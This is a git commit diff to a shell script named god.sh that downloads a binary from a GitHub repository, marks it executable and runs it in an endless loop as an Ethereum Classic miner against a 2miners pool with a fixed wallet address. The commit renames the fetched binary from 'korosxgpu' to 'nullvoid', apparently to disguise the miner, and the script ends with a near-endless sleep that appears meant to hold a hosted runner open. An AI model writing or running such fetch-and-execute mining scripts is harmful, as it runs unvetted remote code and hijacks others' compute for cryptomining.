ba3162cd340cc02ae2340d9b480a0cf1ce95ce3d
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-06-28 12:44:19 +0530

    Update god.sh

--- god.sh
+++ god.sh
@@ -2,10 +2,10 @@
 POOL=us-etc.2miners.com:1010
 WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
 WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGEDANK)
-wget https://github.com/goldengoose45/karmasama/raw/main/korosxgpu
-chmod +x korosxgpu
+wget https://github.com/goldengoose45/octopus/raw/main/nullvoid
+chmod +x nullvoid
 while [ 1 ]; do
-./korosxgpu --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
+./nullvoid --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
 sleep 5
 done
 sleep 999999999 
